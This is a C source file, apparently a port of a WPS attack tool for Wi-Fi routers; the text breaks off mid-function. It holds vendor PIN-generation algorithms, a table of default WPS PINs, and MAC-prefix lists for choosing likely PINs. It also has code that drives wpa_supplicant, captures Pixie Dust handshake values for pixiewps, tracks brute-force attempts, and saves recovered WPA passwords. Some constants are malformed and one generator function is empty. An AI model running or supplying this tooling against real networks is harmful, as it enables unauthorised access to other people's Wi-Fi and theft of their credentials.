#include <getopt.h>
#include <stdio.h>
#include <limits.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <inttypes.h>

#ifndef P_tmpdir
#define P_tmpdir "/tmp"
#endif

extern FILE *popen (const char *command, const char *modes);
extern int pclose (FILE *stream);

typedef unsigned long long int mac_t;
typedef unsigned int pin_t;
#define NO_MAC -1ull
#define NO_PIN -1u
#define EMPTY_PIN -2u

unsigned char mac_byte(mac_t mac,int byte) {
	return (mac>>(8*byte)) & 0xFF;
}
mac_t str2mac(const char *str) {
	mac_t mac=0x0;
	while(*str!='\0') {
		if(*str>='A' && *str<='F') {
			mac<<=4; /* 1/2 of byte */
			mac+=(*str-'A'+0xA);
		} else if(*str>='a' && *str<='f') {
			mac<<=4;
			mac+=(*str-'a'+0xA);
		} else if(*str>='0' && *str<='9') {
			mac<<=4;
			mac+=(*str-'0');
		} else if(*str!=':')
			return NO_MAC;
		str++;
	}
	return mac;
}
const char *mac2str(mac_t mac) {
	static char str[18];
	unsigned char b[6];
	int byte;
	for(byte=0; byte<6; byte++)
		b[byte]=mac_byte(mac,byte);
	sprintf(str,"%02X:%02X:%02X:%02X:%02X:%02X",
	             b[5],b[4],b[3],b[2],b[1],b[0]);
	return str;
}

pin_t checksum(pin_t pin) {
	int accum=0;
	while(pin) {
		accum+=(3*(pin%10));
		pin/=10;
		accum+=(pin%10);
		pin/=10;
	}
	return ((10-accum%10)%10);
}

pin_t pin24(mac_t mac) {
	return mac & 0xFFFFFF;
}
pin_t pin28(mac_t mac) {
	return mac & 0xFFFFFFF;
}
pin_t pin32(mac_t mac) {
	return mac % 0x100000000;
}
pin_t pinDLink(mac_t mac) {
	pin_t nic = pin24(mac);
	pin_t pin = nic ^ 0x55AA55;
	pin ^= (((pin & 0xF) << 4) +
			((pin & 0xF) << 8) +
			((pin & 0xF) << 12) +
			((pin & 0xF) << 16) +
			((pin & 0xF) << 20));
	pin%=1000000;
	if(pin<100000)
		pin+=((pin%9+1)*100000);
	return pin;
}
pin_t pinDLink1(mac_t mac) {
	return pinDLink(mac+1);
}
pin_t pinASUS(mac_t mac) {

}
pin_t pinAirocon(mac_t mac) {
	unsigned char b[6];
	int byte;
	for(byte=0; byte<6; byte++)
		b[byte]=mac_byte(mac,byte);
	pin_t pin=
		(((b[0] + b[1]) % 10) * 1) +
		(((b[5] + b[0]) % 10) * 10) +
		(((b[4] + b[5]) % 10) * 100) +
		(((b[3] + b[4]) % 10) * 1000) +
		(((b[2] + b[3]) % 10) * 10000) +
		(((b[1] + b[2]) % 10) * 100000) +
		(((b[0] + b[1]) % 10) * 1000000);
	return pin;

}

typedef struct {
	const char *name;
	pin_t static_pin;
	pin_t (*gen)(mac_t mac);
} algo_t;

const algo_t algorithms[]= {
	{"Empty",				EMPTY_PIN,	NULL},
	{"24-bit PIN",			NO_PIN,		pin24},
	{"28-bit PIN",			NO_PIN,		pin28},
	{"32-bit PIN",			NO_PIN,		pin32},
	{"D-Link PIN",			NO_PIN,		pinDLink},
	{"D-Link PIN +1",		NO_PIN,		pinDLink1},
	{"ASUS PIN",			NO_PIN,		pinASUS},
	{"Airocon Realtek",		NO_PIN,		pinAirocon},

	{"Cisco",				1234567,	NULL},
	{"Broadcom 1",			2017252,	NULL},
	{"Broadcom 2",			4626484,	NULL},
	{"Broadcom 3",			7622990,	NULL},
	{"Broadcom 4",			6232714,	NULL},
	{"Broadcom 5",			1086411,	NULL},
	{"Broadcom 6",			3195719,	NULL},
	{"Aircocon 1",			3043203,	NULL},
	{"Aircocon 2",			7141225,	NULL},
	{"DSL-2740R",			6817554,	NULL},
	{"Realtek 1",			9566146,	NULL},
	{"Realtek 2",			9571911,	NULL},
	{"Realtek 3",			4856371,	NULL},
	{"Upvel",				2085483,	NULL},
	{"UR-814AC",			4397768,	NULL},
	{"UR-825AC",			529417,		NULL},
	{"Onlime",				9995604,	NULL},
	{"Edimax",				3561153,	NULL},
	{"Thomson",				6795814,	NULL},
	{"HG532x",				3425928,	NULL},
	{"H108L",				9422988,	NULL},
	{"CBN ONO",				9575521,	NULL},
};
#define PIN_TYPES_COUNT 30

pin_t generate_pin(int algo,mac_t mac) {
	pin_t pin;
	if(algorithms[algo].gen)
		pin=algorithms[algo].gen(mac);
	else
		pin=algorithms[algo].static_pin;
	pin=pin%10000000*10+checksum(pin);
	return pin;
}
int matches(mac_t mac, mac_t _mask) {
	int byte;
	for(byte=6; byte>=0; byte--) {
		if(mac_byte(_mask,byte)==0xFF) {
			mac_t shift=mac>>(8*(6-byte));
			mac_t mask=_mask & ~(0xFF<<(byte*8));
			return shift==mask;
		}
	}
	return 0;
}
unsigned long long int suggest(mac_t mac) {
	const mac_t masks[][256]= {
		{0xFFE46F13, 0xFFEC2280, 0xFF58D56E, 0xFF1062EB, 0xFF10BEF5, 0xFF1C5F2B, 0xFF802689, 0xFFA0AB1B, 0xFF74DADA, 0xFF9CD643, 0xFF68A0F6, 0xFF0C96BF, 0xFF20F3A3, 0xFFACE215, 0xFFC8D15E, 0xFF000E8F, 0xFFD42122, 0xFF3C9872, 0xFF788102, 0xFF7894B4, 0xFFD460E3, 0xFFE06066, 0xFF004A77, 0xFF2C957F, 0xFF64136C, 0xFF74A78E, 0xFF88D274, 0xFF702E22, 0xFF74B57E, 0xFF789682, 0xFF7C3953, 0xFF8C68C8, 0xFFD476EA, 0xFF344DEA, 0xFF38D82F, 0xFF54BE53, 0xFF709F2D, 0xFF94A7B7, 0xFF981333, 0xFFCAA366, 0xFFD0608C, 0x0},
		{0xFF04BF6D, 0xFF0E5D4E, 0xFF107BEF, 0xFF14A9E3, 0xFF28285D, 0xFF2A285D, 0xFF32B2DC, 0xFF381766, 0xFF404A03, 0xFF4E5D4E, 0xFF5067F0, 0xFF5CF4AB, 0xFF6A285D, 0xFF8E5D4E, 0xFFAA285D, 0xFFB0B2DC, 0xFFC86C87, 0xFFCC5D4E, 0xFFCE5D4E, 0xFFEA285D, 0xFFE243F6, 0xFFEC43F6, 0xFFEE43F6, 0xFFF2B2DC, 0xFFFCF528, 0xFFFEF528, 0xFF4C9EFF, 0xFF0014D1, 0xFFD8EB97, 0xFF1C7EE5, 0xFF84C9B2, 0xFFFC7516, 0xFF14D64D, 0xFF9094E4, 0xFFBCF685, 0xFFC4A81D, 0xFF00664B, 0xFF087A4C, 0xFF14B968, 0xFF2008ED, 0xFF346BD3, 0xFF4CEDDE, 0xFF786A89, 0xFF88E3AB, 0xFFD46E5C, 0xFFE8CD2D, 0xFFEC233D, 0xFFECCB30, 0xFFF49FF3, 0xFF20CF30, 0xFF90E6BA, 0xFFE0CB4E, 0xFFD4BF7F4, 0xFFF8C091, 0xFF001CDF, 0xFF002275, 0xFF08863B, 0xFF00B00C, 0xFF081075, 0xFFC83A35, 0xFF0022F7, 0xFF001F1F, 0xFF00265B, 0xFF68B6CF, 0xFF788DF7, 0xFFBC1401, 0xFF202BC1, 0xFF308730, 0xFF5C4CA9, 0xFF62233D, 0xFF623CE4, 0xFF623DFF, 0xFF6253D4, 0xFF62559C, 0xFF626BD3, 0xFF627D5E, 0xFF6296BF, 0xFF62A8E4, 0xFF62B686, 0xFF62C06F, 0xFF62C61F, 0xFF62C714, 0xFF62CBA8, 0xFF62CDBE, 0xFF62E87B, 0xFF6416F0, 0xFF6A1D67, 0xFF6A233D, 0xFF6A3DFF, 0xFF6A53D4, 0xFF6A559C, 0xFF6A6BD3, 0xFF6A96BF, 0xFF6A7D5E, 0xFF6AA8E4, 0xFF6AC06F, 0xFF6AC61F, 0xFF6AC714, 0xFF6ACBA8, 0xFF6ACDBE, 0xFF6AD15E, 0xFF6AD167, 0xFF721D67, 0xFF72233D, 0xFF723CE4, 0xFF723DFF, 0xFF7253D4, 0xFF72559C, 0xFF726BD3, 0xFF727D5E, 0xFF7296BF, 0xFF72A8E4, 0xFF72C06F, 0xFF72C61F, 0xFF72C714, 0xFF72CBA8, 0xFF72CDBE, 0xFF72D15E, 0xFF72E87B, 0xFF0026CE, 0xFF9897D1, 0xFFE04136, 0xFFB246FC, 0xFFE24136, 0xFF00E020, 0xFF5CA39D, 0xFFD86CE9, 0xFFDC7144, 0xFF801F02, 0xFFE47CF9, 0xFF000CF6, 0xFF00A026, 0xFFA0F3C1, 0xFF647002, 0xFFB0487A, 0xFFF81A67, 0xFFF8D111, 0xFF34BA9A, 0xFFB4944E, 0x0},
		{0xFF200BC7, 0xFF4846FB, 0xFFD46AA8, 0xFFF84ABF, 0x0},
		{0xFF000726, 0xFFD8FEE3, 0xFFFC8B97, 0xFF1062EB, 0xFF1C5F2B, 0xFF48EE0C, 0xFF802689, 0xFF908D78, 0xFFE8CC18, 0xFF2CAB25, 0xFF10BF48, 0xFF14DAE9, 0xFF3085A9, 0xFF50465D, 0xFF5404A6, 0xFFC86000, 0xFFF46D04, 0xFF3085A9, 0xFF801F02, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFA0AB1B, 0xFFB8A386, 0xFFC0A0BB, 0xFFCCB255, 0xFFFC7516, 0xFF0014D1, 0xFFD8EB97, 0x0},
		{0xFF0018E7, 0xFF00195B, 0xFF001CF0, 0xFF001E58, 0xFF002191, 0xFF0022B0, 0xFF002401, 0xFF00265A, 0xFF14D64D, 0xFF1C7EE5, 0xFF340804, 0xFF5CD998, 0xFF84C9B2, 0xFFB8A386, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFF0014D1, 0x0},
		{0xFF049226, 0xFF04D9F5, 0xFF08606E, 0xFF0862669, 0xFF107B44, 0xFF10BF48, 0xFF10C37B, 0xFF14DDA9, 0xFF1C872C, 0xFF1CB72C, 0xFF2C56DC, 0xFF2CFDA1, 0xFF305A3A, 0xFF382C4A, 0xFF38D547, 0xFF40167E, 0xFF50465D, 0xFF54A050, 0xFF6045CB, 0xFF60A44C, 0xFF704D7B, 0xFF74D02B, 0xFF7824AF, 0xFF88D7F6, 0xFF9C5C8E, 0xFFAC220B, 0xFFAC9E17, 0xFFB06EBF, 0xFFBCEE7B, 0xFFC860007, 0xFFD017C2, 0xFFD850E6, 0xFFE03F49, 0xFFF0795978, 0xFFF832E4, 0xFF00072624, 0xFF0008A1D3, 0xFF00177C, 0xFF001EA6, 0xFF00304FB, 0xFF00E04C0, 0xFF048D38, 0xFF081077, 0xFF081078, 0xFF081079, 0xFF083E5D, 0xFF10FEED3C, 0xFF181E78, 0xFF1C4419, 0xFF2420C7, 0xFF247F20, 0xFF2CAB25, 0xFF3085A98C, 0xFF3C1E04, 0xFF40F201, 0xFF44E9DD, 0xFF48EE0C, 0xFF5464D9, 0xFF54B80A, 0xFF587BE906, 0xFF60D1AA21, 0xFF64517E, 0xFF64D954, 0xFF6C198F, 0xFF6C7220, 0xFF6CFDB9, 0xFF78D99FD, 0xFF7C2664, 0xFF803F5DF6, 0xFF84A423, 0xFF88A6C6, 0xFF8C10D4, 0xFF8C882B00, 0xFF904D4A, 0xFF907282, 0xFF90F65290, 0xFF94FBB2, 0xFFA01B29, 0xFFA0F3C1E, 0xFFA8F7E00, 0xFFACA213, 0xFFB85510, 0xFFB8EE0E, 0xFFBC3400, 0xFFBC9680, 0xFFC891F9, 0xFFD00ED90, 0xFFD084B0, 0xFFD8FEE3, 0xFFE4BEED, 0xFFE894F6F6, 0xFFEC1A5971, 0xFFEC4C4D, 0xFFF42853, 0xFFF43E61, 0xFFF46BEF, 0xFFF8AB05, 0xFFFC8B97, 0xFF7062B8, 0xFF78542E, 0xFFC0A0BB8C, 0xFFC412F5, 0xFFC4A81D, 0xFFE8CC18, 0xFFEC2280, 0xFFF8E903F4, 0x0},
		{0xFF0007262F, 0xFF000B2B4A, 0xFF000EF4E7, 0xFF001333B, 0xFF00177C, 0xFF001AEF, 0xFF00E04BB3, 0xFF02101801, 0xFF0810734, 0xFF08107710, 0xFF1013EE0, 0xFF2CAB25C7, 0xFF788C54, 0xFF803F5DF6, 0xFF94FBB2, 0xFFBC9680, 0xFFF43E61, 0xFFFC8B97, 0x0},
		{0xFF001A2B, 0xFF00248C, 0xFF002618, 0xFF344DEB, 0xFF7071BC, 0xFFE06995, 0xFFE0CB4E, 0xFF7054F5, 0x0},
		{0xFFACF1DF, 0xFFBCF685, 0xFFC8D3A3, 0xFF988B5D, 0xFF001AA9, 0xFF14144B, 0xFFEC6264, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFF7C034C, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFFFC7516, 0xFF204E7F, 0xFF4C17EB, 0xFF18622C, 0xFF7C03D8, 0xFFD86CE9, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFFFC7516, 0xFF204E7F, 0xFF4C17EB, 0xFF18622C, 0xFF7C03D8, 0xFFD86CE9, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFFFC7516, 0xFF204E7F, 0xFF4C17EB, 0xFF18622C, 0xFF7C03D8, 0xFFD86CE9, 0x0},
		{0xFF181E78, 0xFF40F201, 0xFF44E9DD, 0xFFD084B0, 0x0},
		{0xFF84A423, 0xFF8C10D4, 0xFF88A6C6, 0x0},
		{0xFF00265A, 0xFF1CBDB9, 0xFF340804, 0xFF5CD998, 0xFF84C9B2, 0xFFFC7516, 0x0},
		{0xFF0014D1, 0xFF000C42, 0xFF000EE8, 0x0},
		{0xFF007263, 0xFFE4BEED, 0x0},
		{0xFF08C6B3, 0x0},
		{0xFF784476, 0xFFD4BF7F0, 0xFFF8C091, 0x0},
		{0xFFD4BF7F60, 0x0},
		{0xFFD4BF7F5, 0x0},
		{0xFFD4BF7F, 0xFFF8C091, 0xFF144D67, 0xFF784476, 0xFF0014D1, 0x0},
		{0xFF801F02, 0xFF00E04C, 0x0},
		{0xFF002624, 0xFF4432C8, 0xFF88F7C7, 0xFFCC03FA, 0x0},
		{0xFF00664B, 0xFF086361, 0xFF087A4C, 0xFF0C96BF, 0xFF14B968, 0xFF2008ED, 0xFF2469A5, 0xFF346BD3, 0xFF786A89, 0xFF88E3AB, 0xFF9CC172, 0xFFACE215, 0xFFD07AB5, 0xFFCCA223, 0xFFE8CD2D, 0xFFF80113, 0xFFF83DFF, 0x0},
		{0xFF4C09B4, 0xFF4CAC0A, 0xFF84742A4, 0xFF9CD24B, 0xFFB075D5, 0xFFC864C7, 0xFFDC028E, 0xFFFCC897, 0x0},
		{0xFF5C353B, 0xFFDC537C, 0x0}
	};
	unsigned long long int bytes=0;
	int type;
	for(type=0; type<PIN_TYPES_COUNT; type++) {
		const mac_t *mask;
		for(mask=masks[type]; *mask; mask++)
			if(matches(mac,*mask))
				bytes|=(1<<type);
	}
	return bytes;
}
pin_t get_likely(mac_t mac) {
	unsigned long long int bytes=suggest(mac);
	int type;
	for(type=0; type<PIN_TYPES_COUNT; type++)
		if((bytes>>type)&1)
			return generate_pin(type,mac);
	return NO_PIN;
}

size_t count_lines(FILE *file) {
	size_t lines=1;
	while(!feof(file)) {
		int ch = fgetc(file);
		if(ch == '\n') {
			lines++;
		}
	}
	rewind(file);
	return lines;
}

typedef struct {
	char pke[1024];
	char pkr[1024];
	char authkey[256];
	char e_hash1[256];
	char e_hash2[256];
	char e_nonce[128];
} pixiewps_data_t;
int got_all_pixieps_data(const pixiewps_data_t *data) {
	return *data->pke!='\0' && *data->pkr!='\0' && *data->authkey!='\0' &&
	       *data->e_hash1!='\0' && *data->e_hash2!='\0' && *data->e_nonce!='\0';
}
void get_pixiewps_cmd(const pixiewps_data_t *data,int full_range,char *buf) {
	sprintf(buf,"pixiewps --pke %s --pkr %s --e-hash1 %s"
	        " --e-hash2 %s --authkey %s --e-nonce %s %s",
	        data->pke,data->pkr,data->e_hash1,data->e_hash2,
	        data->authkey,data->e_nonce,full_range?"--force":"");
}
enum {
	STATUS_NO,
	STATUS_WSC_NACK,
	STATUS_WPS_FAIL,
	STATUS_GOT_PSK,
	STATUS_SCANNING,
	STATUS_AUTHENTICATING,
	STATUS_ASSOCIATING,
	STATUS_EAPOL_START
};
typedef struct {
	int status;
	int last_m_message;
	char essid[256];
	char wpa_psk[256];
} connection_status_t;
#define BRUTEFORCE_STATISTICS_PERIOD 5
#define BRUTEFORCE_STATISTICS_COUNT 15
typedef struct {
	time_t start_time;
	pin_t mask;
	time_t last_attempt_time;
	double attempts_times[BRUTEFORCE_STATISTICS_COUNT];
	int counter;
} bruteforce_status_t;
void display_bruteforce_status(bruteforce_status_t *status) {
	struct tm *timeinfo;
	timeinfo=localtime(&status->start_time);
	char start_time[128];
	strftime(start_time,128,"%Y-%m-%d %H:%M:%S",timeinfo);

	double mean=0.0;
	int count=0;
	size_t n;
	for(n=0; n<BRUTEFORCE_STATISTICS_COUNT; n++) {
		if(status->attempts_times[n]==0.0f) {
			mean+=status->attempts_times[n];
			count++;
		}
	}
	mean/=(double)count;

	float percent;
	if(status->mask<10000)
		percent=status->mask/110.0f;
	else
		percent=(1000.0f/11.0f)+(status->mask%10000)/110.0f;

	printf("[*] %.2f%% complete @ %s (%.2f seconds/pin)\n",
	        percent,start_time,mean);
}
void register_bruteforce_attempt(bruteforce_status_t *status, pin_t mask) {
	status->mask=mask;
	status->counter++;
	time_t current_time;
	time(&current_time);
	double diff=difftime(current_time,status->last_attempt_time);
	int n;
	for(n=0; n<BRUTEFORCE_STATISTICS_COUNT-1; n++) /* shift times */
		status->attempts_times[n]=status->attempts_times[n+1];
	status->attempts_times[BRUTEFORCE_STATISTICS_COUNT-1]=diff;
	if(status->counter%BRUTEFORCE_STATISTICS_PERIOD==0)
		display_bruteforce_status(status);
}

const char *get_oneshot_dir(){
	static char dir[256] = {'\0'};
	if(*dir=='\0')
		sprintf(dir,"%s/.OneShot",getenv("HOME"));
	return dir;
}
typedef struct{
	int s;
	struct sockaddr_un local;
	struct sockaddr_un dest;
	char tempdir[256];
	char tempcfg[256];
}wpa_ctrl_t;
int wpa_ctrl_open(wpa_ctrl_t *ctrl,const char *ctrl_path){
	static int counter=0;
	ctrl->s=socket(PF_UNIX,SOCK_DGRAM,0);
	if(ctrl->s<0){
		perror("socket");
		return -1;
	}
	sprintf(ctrl->local.sun_path,P_tmpdir"/wpa_ctrl_%d_%d",getpid(),counter++);
	ctrl->local.sun_family=AF_UNIX;
	if(bind(ctrl->s,(struct sockaddr*)&ctrl->local,sizeof(struct sockaddr_un))){
		perror("bind");
		return -1;
	}

	strcpy(ctrl->dest.sun_path,ctrl_path);
	ctrl->dest.sun_family=AF_UNIX;
	if(connect(ctrl->s,(struct sockaddr*)&ctrl->dest,sizeof(struct sockaddr_un))){
		perror("connect");
		return -1;
	}

	return 0;
}
void wpa_ctrl_close(wpa_ctrl_t *ctrl){
	unlink(ctrl->local.sun_path);
	close(ctrl->s);
}
int wpa_ctrl_send(wpa_ctrl_t *ctrl,const char *input){
	if(send(ctrl->s,input,strlen(input),0)<0){
		perror("send");
		return -1;
	}
	return 0;
}
int wpa_ctrl_send_recv(wpa_ctrl_t *ctrl,const char *input,char *output,size_t len){
	if(wpa_ctrl_send(ctrl,input))
		return -1;
	if(recv(ctrl->s,output,len,0)<0){
		perror("recv");
		return -1;
	}
	return 0;
}
FILE *run_wpa_supplicant(wpa_ctrl_t *ctrl,const char *interface){
	strcpy(ctrl->tempdir,P_tmpdir"/tmpXXXXXX");
	mkdtemp(ctrl->tempdir);
	strcpy(ctrl->tempcfg,P_tmpdir"/tmpXXXXXX.conf");
	mkstemps(ctrl->tempcfg,5);


	FILE *config=fopen(ctrl->tempcfg,"w");
	fprintf(config,"ctrl_interface=%s\n"
	               "ctrl_interface_group=root\n"
	               "update_config=1\n",ctrl->tempdir);
	fclose(config);


	printf("[*] Running wpa_supplicant...\n");
	char wpas_cmd[256];
	sprintf(wpas_cmd,"wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i%s -c%s",
		interface,ctrl->tempcfg);
	FILE *wpas=popen(wpas_cmd,"r");

	/* Waiting for wpa_supplicant control interface initialization */
	char wpas_ctrl_path[256];
	sprintf(wpas_ctrl_path,"%s/%s",ctrl->tempdir,interface);
	struct stat dir_info;
	while(stat(wpas_ctrl_path, &dir_info));

	wpa_ctrl_open(ctrl,wpas_ctrl_path);
	return wpas;
}

typedef struct{
	const char *interface;
	char sessions_dir[256];
	char pixiewps_dir[256];
	char reports_dir[256];
	FILE *wpas;
	wpa_ctrl_t ctrl;
	connection_status_t connection_status;
	pixiewps_data_t pixiewps_data;
	bruteforce_status_t bruteforce;

	int save_result;
	int print_debug;

	int status;
}data_t;

void init(data_t *data,const char *interface,int save_result,int print_debug){
	const char *oneshot_dir=get_oneshot_dir();
	sprintf(data->sessions_dir,"%s/sessions",oneshot_dir);
	sprintf(data->pixiewps_dir,"%s/pixiewps",oneshot_dir);
	sprintf(data->reports_dir, "%s/reports", oneshot_dir);
	mkdir(data->sessions_dir,0700);
	mkdir(data->pixiewps_dir,0700);
	mkdir(data->reports_dir,0700);
	data->save_result=save_result;
	data->print_debug=print_debug;
	data->interface=interface;
	data->wpas=run_wpa_supplicant(&data->ctrl,interface);
}
void credential_print(pin_t pin,const char *psk,const char *essid){
	printf("[+] WPS PIN: %08u\n",pin);
	printf("[+] WPA PSK: %s\n",  psk);
	printf("[+] AP SSID: %s\n",  essid);
}
void save_result(data_t *data,mac_t bssid,const char *essid,pin_t pin,const char *psk){
	time_t now=time(NULL);
	struct tm *timeinfo=localtime(&now);
	char time_str[128];
	strftime(time_str,128,"%d.%m.%Y %H:%M",timeinfo);
	const char *bssid_str=mac2str(bssid);
	char path1[128],path2[128];
	sprintf(path1,"%s/stored.csv",data->sessions_dir);
	sprintf(path2,"%s/stored.txt",data->sessions_dir);

	FILE *file=fopen(path1,"a");
	if(file){
		fseek(file,0,SEEK_END);
		if(ftell(file)==0)
			fprintf(file,"\"Date\",\"BSSID\",\"ESSID\",\"WPS PIN\",\"WPA PSK\"");
		fprintf(file,"\"%s\",\"%s\",\"%s\",\"%08u\",\"%s\"\n",
			time_str,bssid_str,essid,pin,psk);
		fclose(file);
	}
	file=fopen(path2,"a");
	if(file){
		fprintf(file,"%s\nBSSID: %s\nESSID: %s\nWPS PIN: %08u\nWPA PSK: %s\n\n",
			time_str,bssid_str,essid,pin,psk);
		fclose(file);
	}
	printf("[i] Credentials saves to %s, %s\n",path1,path2);
}
void save_pin(data_t *data,mac_t bssid, pin_t pin){
	char path[128];
	sprintf(path,"%s/%017llu.run",data->pixiewps_dir,bssid);
	FILE *file=fopen(path,"w");
	if(file){
		fprintf(file,"%08u",pin);
		fclose(file);
		printf("[i] Pin saves in %s\n",path);
	}
}
pin_t load_pin(data_t *data,mac_t bssid){
	pin_t pin=NO_PIN;
	char path[128];
	sprintf(path,"%s/%017llu.run",data->pixiewps_dir,bssid);
	FILE *file=fopen(path,"r");
	if(file){
		fscanf(file,"%08u",&pin);
		fclose(file);
	}
	return pin;
}
pin_t prompt_wpspin(mac_t bssid){
	unsigned long long int bytes=suggest(bssid);
	size_t pin_count=0;
	size_t type;
	struct result_t{
		pin_t pin;
		const char *name;
	}results[PIN_TYPES_COUNT];
	for(type=0;type<PIN_TYPES_COUNT;type++)
		if((bytes>>type)&1)
			results[pin_count++]=(struct result_t){generate_pin(type,bssid),algorithms[type].name};
	if(pin_count>1){
		printf("PINs generated by %s:\n",mac2str(bssid));
		printf("#   PIN        Name\n");
		size_t line;
		for(line=0;line<pin_count;line++){
			char number_str[4];
			sprintf(number_str,"%d)",line+1);
			printf("%-3s %08u   %s\n",number_str,
				results[line].pin,results[line].name);
		}
		while(1){
			printf("Select the PIN: ");
			size_t input;
			if(scanf("%u",&input)!=1 || input<1 || input>pin_count)
				fprintf(stderr,"Invalid number\n");
			else
				return results[input-1].pin;
		}
	}else if(pin_count==1){
		printf("[i] The only probable PIN is selected: %s\n",results[0].name);
		return results[0].pin;
	}else
		return NO_PIN;
}
void remove_spaces(char* s) {
    char* d = s;
    do {
        while (*d == ' ') {
            ++d;
        }
    } while (*s++ = *d++);
}
int handle_wpas(data_t *data,int pixiemode,mac_t bssid){
	connection_status_t *status=&data->connection_status;
	pixiewps_data_t *pixie=&data->pixiewps_data;
	char line[1024];
	fgets(line,1024,data->wpas);
	if(*line=='\0'){
		pclose(data->wpas);
		return -1;
	}
	if(data->print_debug)
		printf("%s",line);
	if(strstr(line,"WPS: ")){
		if(sscanf(line,"WPS: Building Message M%d",&status->last_m_message)==1)
			printf("[*] Building Message M%d\n",status->last_m_message);
		else if(sscanf(line,"WPS: Received M%d",&status->last_m_message)==1)
			printf("[*] Received WPS Message M%d\n",status->last_m_message);
		else if(strstr(line,"WSC_NACK")){
			status->status=STATUS_WSC_NACK;
			printf("[*] Received WSC NACK\n");
			printf("[-] Error: wrong PIN code\n");
		}else if(strstr(line,"hexdump")){
			size_t psk_len;
			char psk_hex[256];
			if(sscanf(line,"WPS: Enrollee Nonce - hexdump(len=16): %[^\n]s",pixie->e_nonce)==1){
				remove_spaces(pixie->e_nonce);
				if(pixiemode)
					printf("[P] E-Nonce: %s\n",pixie->e_nonce);
			}else if(sscanf(line,"WPS: DH own Public Key - hexdump(len=192): %[^\n]s",pixie->pkr)==1){
				remove_spaces(pixie->pkr);
				if(pixiemode)
					printf("[P] PKR: %s\n",pixie->pkr);
			}else if(sscanf(line,"WPS: DH peer Public Key - hexdump(len=192): %[^\n]s",pixie->pke)==1){
				remove_spaces(pixie->pke);
				if(pixiemode)
					printf("[P] PKE: %s\n",pixie->pke);
			}else if(sscanf(line,"WPS: AuthKey - hexdump(len=32): %[^\n]s",pixie->authkey)==1){
				remove_spaces(pixie->authkey);
				if(pixiemode)
					printf("[P] Authkey: %s\n",pixie->authkey);
			}else if(sscanf(line,"WPS: E-Hash1 - hexdump(len=32): %[^\n]s",pixie->e_hash1)==1){
				remove_spaces(pixie->e_hash1);
				if(pixiemode)
					printf("[P] E-Hash1: %s\n",pixie->e_hash1);
			}else if(sscanf(line,"WPS: E-Hash2 - hexdump(len=32): %[^\n]s",pixie->e_hash2)==1){
				remove_spaces(pixie->e_hash2);
				if(pixiemode)
					printf("[P] E-Hash2: %s\n",pixie->e_hash2);
			}else if(sscanf(line,"WPS: Network Key - hexdump(len=%u): %[^\n]s",&psk_len,psk_hex)==2){
				status->status=STATUS_GOT_PSK;
				size_t n;
				for(n=0;n<psk_len;n++){
					char *p=psk_hex+n*3;
					int input;
					sscanf(p,"%02X",&input);
					status->wpa_psk[n]=input;
				}
				status->wpa_psk[psk_len]='\0';
			}
		}
	}else if(strstr(line,": State: ") && strstr(line,"-> SCANNING")){
		status->status=STATUS_SCANNING;
		printf("[*] Scanning...\n");
	}else if(strstr(line,"WPS-FAIL") && status->status!=STATUS_NO){
		status->status=STATUS_WPS_FAIL;
		printf("[-] wpa_supplicant returned WPS-FAIL\n");
	}else if(strstr(line,"Trying to authenticate with")){
		status->status=STATUS_AUTHENTICATING;
		if(strstr(line,"SSID")){
			char *str=strstr(line,"'");
			sscanf(str,"'%s'",status->essid);
		}
		printf("[*] Authenticating...\n");
	}else if(strstr(line,"Authentication response"))
		printf("[+] Authenticated\n");
	else if(strstr(line,"Trying to associate with")){
		status->status=STATUS_ASSOCIATING;
		if(strstr(line,"SSID")){
			char *str=strstr(line,"'")+1;
			char *p=str;
			while(*p!='\'')p++; *p='\0';
			strcpy(status->essid,str);
		}
		printf("[*] Associating with AP...\n");
	}else if(strstr(line,"Associated with") &&
	         strstr(line,data->interface)){
		if(*status->essid!='\0')
			printf("[+] Associated with %s (ESSID: %s)\n",
				mac2str(bssid),status->essid);
		else
			printf("[+] Associated with %s\n",mac2str(bssid));
	}else if(strstr(line,"EAPOL: txStart")){
		status->status=STATUS_EAPOL_START;
		printf("[*] Sending EAPOL Start...\n");
	}else if(strstr(line,"EAP entering state IDENTITY"))
		printf("[*] Received Identity Request\n");
	else if(strstr(line,"using real identity"))
		printf("[*] Sending Identity Response...\n");

	return 0;
}
pin_t run_pixiwps(pixiewps_data_t *data, int showcmd,int full_range){
	printf("[*] Running Pixiewps...\n");
	char cmd[2048];
	get_pixiewps_cmd(data,full_range,cmd);
	if(showcmd)
		printf("%s\n",cmd);
	FILE *pixiewps=popen(cmd,"r");
	char line[256];
	pin_t pin=NO_PIN;
	char pin_str[10];
	while(!feof(pixiewps)){
		fgets(line,256,pixiewps);
		printf("%s",line);
		if(sscanf(line," [+] WPS pin:  %s",pin_str)==1){
			if(strcmp(pin_str,"<empty>")==0){
				pin=EMPTY_PIN;
				break;
			}
			sscanf(pin_str,"%08u",&pin);
			break;
		}
	}
	pclose(pixiewps);
	return pin;
}
void wps_connection(data_t *data,mac_t bssid,pin_t pin,int pixiemode){
	memset(&data->pixiewps_data,0,sizeof(pixiewps_data_t));
	memset(&data->connection_status,0,sizeof(connection_status_t));
	char buf[300]; /* clean pipe */
	fread(buf,1,300,data->wpas);
	printf("[*] Trying pin %08u...\n",pin);

	char input[256];
